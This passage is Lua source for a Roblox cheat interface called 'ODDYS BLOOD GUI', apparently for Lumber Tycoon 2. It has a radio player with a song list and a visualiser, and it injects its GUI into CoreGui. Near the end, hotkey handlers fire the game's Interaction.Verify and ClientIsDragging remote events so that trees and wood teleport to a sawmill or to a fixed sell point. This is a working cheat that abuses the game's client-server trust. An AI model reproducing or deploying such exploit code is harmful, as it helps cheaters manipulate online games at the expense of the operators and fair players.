	"4291241756",
	"1464709380",
	"1134058594",
	"2795309551",
	"2808069027",
	"1175748632 ",
	"2560631742",
	"441150761",
	"897054199",
	"512482601",
	"2916513007",
	"2916450382",
	"2911133909",
	"2920534090",
	"2653366831",
	"2653049912",
	"2043307868",
	"1327222154",
	"2068058787",
	"2550256434",
	"844360638",
	"332379850",
	"1472103710",
	"613257931",
	"2454470726",
	"2036067038",
	"603146550",
	"2065266416",
	"2742427088",
	"1172077868",
	"859861483",
	"2255118726",
	"1005445264",
	"985571061",
	"2798381986",
	"1138904665",
	"1316845233",
	"2240509500",
	"2698389751",
	"1300488711",
	"971487030",
	"978616673",
	"3188425141",
	"2139972744",
	"1247011377",
	"1014862046",
	"981890082",
	"2107586824",
	"561661266",
	"2312896111",
	"716547078",
	"544422657",
	"2677300218",
	"1362952031",
	"790300829",
	"981170452",
	"3663034837",
	"3401994659",
	"978628901",
	"657813878",
	"2121086591",
	"3060904907",
	"2689788050"

}

local musicnames = {
	"Clean Bandit - Symphony",
	"The Chainsmokers - Closer",
	"AC/DC - If You Want Blood",
	"Post Malon - Better Now",
	"Selena Gomez - lose you to",
	"Selena Gomez - Look At Her Now",
	"Travi$ Scott - Hot (Remix)",
	"Kanye West - Follow God",
	"Coldplay - Paradise",
	"Coldplay - Adventure Of A Lifetime (Instro)",
	"Dua Lipa - Don't Start Now",
	"Post Malon - Wow",
	"lizzo - good as hell",
	"Maroon 5 - Memories (cover)",
	"Lewis Capaldi - Bruises",
	"Lewis Capaldi - One",
	"Kanye West - Follow God",
	"Camila Cabello - Havana",
	"Ed Sheeran - Stay with me",
	"The Script - Hall of Fame (8D Audio)",
	"Pink Floyd - Another Brick In The Wall",
	"We'll rock you (Queen) + Back in black (ACDC)",
	"Queen-These Are The Days Of Our Lives",
	"Coldplay - Adventure Of A Lifetime",
	"Cheat Codes - No Promises ft. Demi Lovato",
	"Marshmello - Alone",
	"Post Malone - Better Now",
	"Post Malone - Paranoid",
	"Post Malone - Psycho",
	"Post Malone - White Iverson",
	"Imagine Dragons - Thunder",
	"Imagine Dragons - Radioactive",
	"Sick Luke x Yzomandias - World Wide Way",
	"Transformers 2 (The Game)",
	"YZOMANDIAS - Nevzlátejte",
	"YBN Nahmir - Rubbin Off The Paint",
	"Global Dan - Off White",
	"Famous Dex - Swagg [Bass Boosted]",
	"Aero Chord feat- DDARK - Shootin Stars",
	"Ahrix - Evolving",
	"Alan Walker - Alone [Full]",
	"Audioscribe - Free Fall [Full]",
	"Cartoon - On & On",
	"Cartoon - Why We Lose [FULL]",
	"Culture Code & SirensCeol - Code of the Siren",
	"DEAF KEV - Invincible ### Release",
	"Desmeon - Hellcat FULL",
	"Diamond Eyes - Everything [NCS Release]",
	"Diamond Eyes - Flutter [NCS Release]",
	"Different Heaven - Nekozilla",
	"Disfigure - Blank [FULL]",
	"Distrion & Alex Skrindo - Entropy",
	"Diviners feat. Contacreast - Tropic Love",
	"Diviners-Savanah (NCS) [FULL SONG]",
	"Electro Light - Symbolism ~FULL~",
	"Elektronomia - Heaven",
	"Elektronomia - Limitless [Full]",
	"Elektronomia - Sky High",
	"Itro & Tobu - Cloud 9 FULL",
	"Janji - Heroes Tonight",
	"JJD - Adventure Full Audio",
	"Jim Yosef & Anna Yvette - Linked",
	"Jim Yosef - Arrow [NCS Release] FULL SONG",
	"K-391 - Earth",
	"Laszlo - Fall to Light Full",
	"Lensko - Circles [NCS Release]",
	"My Heart - Different Heaven & EH!DE [NCS]",
	"[FULL Version] Paul F. Savag [NCS Realease]",
	"Pegboard Nerds - Pink Cloud [Full]",
	"Razihel - Lxove U",
	"RetroVision - Puzzle [NCS Release]",
	"Spektrem - Shine",
	"Syn Cole - Feel Good",
	"Tobu - Candyland [FULL]",
	"Tobu - Infectious FULL",
	"Unknown Brain - Superhero (feat. Chris Linton)",
	"Vanze Forever (feat. Brent)",
	"[FULL] Whales & ggnoaa - Paranoia [NCS Release]",
	"[NCM] Lost Sky - Dreams",
}



--Parent

vslz.Parent = RadioFrame
fr2tl2.Parent = RadioFrame
fr2tb1.Parent = RadioFrame
scrf.Parent = RadioFrame
fr3tl2tb1.Parent  = RadioFrame
fr3tl3tb1.Parent  = RadioFrame
fr3tl3.Parent  = RadioFrame

--create preset music tabs

for i=1,#musicnames do
	local sbc = Instance.new("TextButton",scrf)
	sbc.Name = i
	sbc.Size = UDim2.new(1, 0,0, 25)
	sbc.Position = UDim2.new(0, 0, 0, (i*25)-25)
	sbc.BorderSizePixel = 0
	sbc.BackgroundColor3 = clr(143, 121, 32)
	sbc.Font = "SourceSansBold"
	sbc.FontSize = "Size12"
	sbc.TextColor3 = textcolor
	sbc.TextWrapped = true
	sbc.Text = musicnames[i]
	sbc.AutoButtonColor = false
	if (i % 2 == 0) then
		sbc.BackgroundTransparency = 1
	else
		sbc.BackgroundTransparency = 1
	end
	sbc.MouseButton1Click:connect(function()
		sound.SoundId = "rbxassetid://"..music[i]
		sound:Play()
		fr2tl2.Text = ""..musicnames[i]
                                           
	end)
end

--backgroundcolor3

fr2tb1.BackgroundColor3 = clr(236, 240, 241)
fr2tl2.BackgroundColor3 = clr(200, 167, 0)
fr3tl2tb1.BackgroundColor3 = clr(236, 240, 241)
fr3tl3.BackgroundColor3 = clr(255, 255, 255)
fr3tl3tb1.BackgroundColor3 = Color3.fromRGB(249, 233, 153)
scrf.BackgroundColor3 = clr(177, 134, 4)
vslz.BackgroundColor3 = clr(177, 134, 4)

--backgroundtransparency

fr2tb1.BackgroundTransparency = 1
fr2tl2.BackgroundTransparency = 1
fr3tl2tb1.BackgroundTransparency = 1
fr3tl3.BackgroundTransparency = 1
fr3tl3tb1.BackgroundTransparency = 0
scrf.BackgroundTransparency = 1
vslz.BackgroundTransparency = 1

--bordersizepixel

fr2tb1.BorderSizePixel = 0
fr2tl2.BorderSizePixel = 0
fr3tl2tb1.BorderSizePixel = 0
fr3tl3.BorderSizePixel = 0
fr3tl3tb1.BorderSizePixel = 0
scrf.BorderSizePixel = 0
vslz.BorderSizePixel = 0

--position

fr2tb1.Position = UDim2.new(0, 40, 0, 173)
fr2tl2.Position = UDim2.new(0, 23,0, 13)
fr3tl2tb1.Position = UDim2.new(0, 35, 0, 145)
fr3tl3.Position = UDim2.new(0, 91, 0, 142)
fr3tl3tb1.Position = UDim2.new(0, 95, 0, 125)
scrf.Position = UDim2.new(0, -10, 0, 195)
vslz.Position = UDim2.new(0, 36,0, 16)

--size

fr2tb1.Size = UDim2.new(0, 125,0, 20)
fr2tl2.Size = UDim2.new(0, 155, 0, 32)
fr3tl2tb1.Size = UDim2.new(0, 15,0, 15)
fr3tl3.Size = UDim2.new(0, 35, 0, 12)
fr3tl3tb1.Size = UDim2.new(0, 15,0, 15)
scrf.Size = UDim2.new(0, 220,1, -10)
scrf.CanvasSize = UDim2.new(0, 0, 0, 2000)
scrf.ScrollBarThickness = 4
vslz.Size = UDim2.new(0, 150, 0, 75)

--text

fr3tl3.Text = "01-10"
fr3tl2tb1.Text = ""
fr3tl3tb1.Text = ""
fr2tb1.Text = "Music ID"
fr2tl2.Text = "Nothing is playing"

--textcolor

fr3tl3.TextColor3 = Color3.fromRGB(249, 233, 153)
fr3tl2tb1.TextColor3 = textcolor
fr3tl3tb1.TextColor3 = textcolor2
fr2tb1.TextColor3 = Color3.fromRGB(249, 233, 153)
fr2tl2.TextColor3 = Color3.fromRGB(249, 233, 153)

--fontsize

fr3tl3.FontSize = "Size12"
fr3tl2tb1.FontSize = "Size14"
fr3tl3tb1.FontSize = "Size14"
fr2tb1.FontSize = "Size14"
fr2tl2.FontSize = "Size14"

--font

fr3tl3.Font = "SourceSansLight"
fr3tl2tb1.Font = "SourceSans"
fr3tl3tb1.Font = "SourceSans"
fr2tb1.Font = "SourceSans"
fr2tl2.Font = "SourceSansItalic"
fr3tl3.TextXAlignment = "Left"
fr2tl2.TextWrapped = true


fr3tl2tb1.MouseButton1Click:connect(function()
	if not looped then
		looped = true
		sound.Looped = true
                                           fr2tb1.Text = "Loop On"
		fr3tl2tb1.BackgroundColor3 = clr(178, 180, 181)
	else
		looped = false
		sound.Looped = false
                                           fr2tb1.Text = "Loop Off"
		fr3tl2tb1.BackgroundColor3 = clr(236, 240, 241)
	end
end)

fr3tl3tb1.FocusLost:connect(function()
	if tonumber(fr3tl3tb1.Text) < 11 and tonumber(fr3tl3tb1.Text) >= 0.1 then
		sound.Volume = fr3tl3tb1.Text
		fr3tl3tb1.Text = ""
	end
end)

fr2tb1.FocusLost:connect(function()
	local custom = game:GetService("MarketplaceService"):GetProductInfo(fr2tb1.Text)
	if custom.AssetTypeId == 3 then
		fr2tl2.Text = ""..custom.Name
		sound.SoundId = "rbxassetid://"..fr2tb1.Text
		sound:Play()
	else
		fr2tl2.Text = "Invalid ID: "..fr2tb1.Text
	end
	
end)

Stop.MouseButton1Click:connect(function()
	for i, v in next,vslz:GetChildren() do
		v:TweenSize(UDim2.new(0, 2, 0, 1), "Out", "Quad", .2, true)
	end
	sound.SoundId = 0
	fr2tl2.Text = "Nothing is playing."
end)


for a=1,39 do
	local vsb = Instance.new("Frame",vslz)
	vsb.Name = "vsb"..a-1
	vsb.Size = UDim2.new(0,2,0,1)
	vsb.Position = UDim2.new(0,(a*3)-1,1,0)
	vsb.BackgroundColor3 = clr(255, 255, 255)
	vsb.BackgroundTransparency = 0.6
	vsb.BorderSizePixel = 0
	vsb.AnchorPoint = Vector2.new(0,1)
end

local Bars = {}

for i,v in next,vslz:GetChildren() do
	table.insert(Bars, v)
end

Height = 74


local nBars,Tweens=#Bars-1,{}

local function quadIn(t,b,c,d) t=t/d; return c*t*t+b; end;
local function quadOut(t,b,c,d) t=t/d; return -c*t*(t-2)+b; end;
local function Quad(obj,val,ease,d)
	local t,f,con,nt,st,sd=tick()
	Tweens[obj]=t -- Set identifier
	st=obj.Size.Y.Offset -- Start Value
	sd=val-st -- Change in Value
	f=ease=='In' and quadIn or quadOut -- Choose between Out/In
	con=game:GetService'RunService'.RenderStepped:connect(function() nt=tick()-t
		if Tweens[obj]~=t then -- Check for override
			con:disconnect()
			return
		end
		local nv=math.max(.2,f(math.min(d,nt),st,sd,d)) -- New Value
		obj.Size=UDim2.new(0, 2, 0, nv)
		if nt>d then -- Easing done?
			con:disconnect()
			if ease~='In' then
				Quad(obj,.2,'In',.3) -- Drop the bar
			end
		end
	end)
end

local function CheckSet(N,S,D) -- Number, Scale, Direction
	local nS=vslz["vsb"..tostring(N)].Size.Y.Offset
	if S>nS then
		Set(N,nS+(S-nS)/3,D)
	end
end

function Set(N,S,D) -- Number, Scale, Direction
	Quad(vslz["vsb"..tostring(N)],S,'Out',.1)
	if N>0 and D~=1 then -- Checks left for smaller bars to manipulate
		CheckSet(N-1,S,-1)
	end
	if N<nBars and D~=-1 then -- Checks right...
		CheckSet(N+1,S,1)
	end
end

-- RENDER LOOP --
local MPL,PL,curr=0 curr=sound.SoundId
game:service'RunService'.RenderStepped:connect(function()
	PL=sound.PlaybackLoudness
	if sound.IsPlaying and PL==PL then -- Sound is playing & PlaybackLoudness is not undefined
		if curr~=sound.SoundId then MPL=0 -- Reset the relative Max PlaybackLoudness on song change
			curr=sound.SoundId
		end
		MPL=math.max(PL,MPL) PL=PL/MPL -- Normalize PL based on relative Max PlaybackLoudness
		if PL==PL then
			Set(math.floor(PL*nBars),PL*Height) -- Modify bar relative to PlaybackLoudness
		end
	end
end)


local Menus = {
[Player] = PlayerFrame;
[TeleportA] = Waypoints;
[AIntroImage] = BloodFrameInfo;
[Woodmenu] = WoodFrame;
[Sorter] = MoveFrame;
[PaintMove] = MovePaint;
[FurnMove] = MoveFurn;
[WoodMove] = MoveWood;
[ConvMove] = MoveConv;
[AxesMove] = MoveAxes;
[VehicleMove] = MoveVehicle;
[WireMove] = MoveWire;
[GiftsMove] = MoveGifts;
[OtherMove] = MoveOther;
[GlassMove] = MoveGlass;
[toolamenu] = toolaFrame;
[Buymenu] = BuyFrame;
[Radio] = RadioFrame;
[Btoolamenu] = LT2GUI2Frame;
[wrus] = Woodrus;
[fshop] = Furniture1;
[bcps] = BobsCarPics;
[ls] = LogicStore;
[bp] = BluePrint1;
}
for button,frame in pairs(Menus) do
	button.MouseButton1Click:connect(function()
		if frame.Visible then
			frame.Visible = false
			return
		end
		for k,v in pairs(Menus) do
			v.Visible = v == frame
		end
	end)
end


--- Open/Close ---

function makesound(id)
local s=Instance.new("Sound",BLOOD)
s.SoundId=id
s.Volume=5
s.PlaybackSpeed=1
s:Play()
end

Open.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	MainFrame:TweenPosition(UDim2.new(1, -500, 0.7, -410), "Out", "Back",2.5)
	OpenFrame.Visible = true
	MainFrame.Visible = true
end)

Minimize.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
	MainFrame:TweenPosition(UDim2.new(0.5, -40, 0, -28), "In", "Back",2.5)
	wait(2.5)
    MainFrame.Visible = false
    OpenFrame.Visible = true
end)

CloseBLOOD.MouseButton1Down:connect(function()
  makesound("rbxassetid://156785206")
	MainFrame:TweenPosition(UDim2.new(0.5, -40, 0, -28), "In", "Back",2.5)
	wait(2.5)
	game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "ODDYS BLOOD GUI",
Text = "Thanks for using!",
Duration = 6,
	})

BLOOD:destroy()
VBlood:destroy()
end)

--bring up menu
CurrentItem.MouseButton1Click:Connect(function()
if Picker.Visible == false then
Picker.Visible = true
else
Picker.Visible = false
end
end)

VBlood = Instance.new('ScreenGui')
TitleVersion = Instance.new('Frame')
Title = Instance.new('TextLabel')
Version = Instance.new('TextLabel')

VBlood.Name = 'VBlood'
VBlood.Parent = game.CoreGui

TitleVersion.Name = 'TitleVersion'
TitleVersion.Parent = VBlood
TitleVersion.BackgroundColor3 = Color3.new(1, 1, 1)
TitleVersion.BackgroundTransparency = 1
TitleVersion.Position = UDim2.new(0, 10, 0, 10)
TitleVersion.Size = UDim2.new(0, 330, 0, 200100)
	

Title.Name = 'Title'
Title.Parent = TitleVersion
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, -611, 0, 611)
Title.Size = UDim2.new(0, 288, 0, 34)
Title.Font = Enum.Font.Fantasy
Title.Text = 'BLOOD'
Title.TextColor3 = Color3.new(255, 0, 0)
Title.TextSize = 30
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Left
Title:TweenPosition(UDim2.new(0, 11, 0, 611), "In", "Back",2.5)

Version.Name = 'Version'
Version.Parent = TitleVersion
Version.BackgroundColor3 = Color3.new(1, 1, 1)
Version.BackgroundTransparency = 1
Version.Position = UDim2.new(0, 611, 0, -645)
Version.Size = UDim2.new(0, 146, 0, 22)
Version.Font = Enum.Font.Fantasy
Version.Text = 'Version 3.6'
Version.TextColor3 = Color3.new(1, 1, 1)
Version.TextSize = 17
Version.TextWrapped = true
Version.TextXAlignment = Enum.TextXAlignment.Left
Version:TweenPosition(UDim2.new(0, 11, 0, 645), "In", "Back",2.5)

Option = false
BTool = "Nothing"
WCollide = "Nothing"
LT2Info = "Nothing"
GreyStart = "Nothing"
MDown = false
afkactive = false
CustomLocationSet = false


-- Wood Teleports

sawmillkey = "q"
tptosawmillkey = "e"
sellkey = "r"

SetSawmillKey.MouseButton1Click:Connect(function()
	sawmillkey = SetSawBox.Text
end)

SetSawTPKey.MouseButton1Click:Connect(function()
	tptosawmillkey = SawTPBox.Text
end)

SetSellTPKey.MouseButton1Click:Connect(function()
	sellkey = SellWoodBox.Text
end)

Mouse = game.Players.LocalPlayer:GetMouse()

Treee = nil

Mouse.KeyDown:connect(function(key)
    if key:lower() == tptosawmillkey then
        Treee = Mouse.Target
    end
    if Treee ~= nil then
        Mod(Treee)
    end
end)

Mouse.KeyDown:connect(function(key)
    if key:lower() == sawmillkey then
        if Mouse.Target.Parent:FindFirstChild("BlockageAlert") then
            Sawmill = Mouse.Target.Parent 
        else 
            Sawmill = Mouse.Target.Parent.Parent
        end
        if Sawmill:FindFirstChild("BlockageAlert") and Sawmill:FindFirstChild("Owner") then
            SawmillC = true
            SawmillSetTitle.Text = "Selected"
            SawmillSetTitle.TextColor3 = Color3.new(0, 255, 0)
        else
            SawmillC = false
            print"Something went wrong while setting the sawmill!"
        end
    end
end)

function Mod(SelectedPart)
    if SawmillC ~= true then 
        print'Set the sawmill with "P"!'
        return
    end
    if SelectedPart.Parent:FindFirstChild("TreeClass") and SelectedPart.Parent:FindFirstChild("Owner") then
        local Tree = SelectedPart.Parent
        Tree.PrimaryPart = SelectedPart
        game.ReplicatedStorage.Interaction.Verify:FireServer('Item owned by player',Tree)
        Tree:SetPrimaryPartCFrame(Sawmill.Particles.CFrame)
        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Tree)
    end
end

Wood = nil

Mouse.KeyDown:connect(function(key)
	if key:lower() == sellkey then
		Wood = Mouse.Target
	end
    if Wood ~= nil then
        Move(Wood)
    end
end)

function Move(SelectedPart)
	if SelectedPart.Parent:FindFirstChild("TreeClass") and SelectedPart.Parent:FindFirstChild("Owner") then
		local Tree = SelectedPart.Parent
		Tree.PrimaryPart = SelectedPart
		game.ReplicatedStorage.Interaction.Verify:FireServer('Item owned by player',Tree)
		Tree:SetPrimaryPartCFrame(CFrame.new(330.3, -0.4, 91.3))
		game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Tree)
	end
end
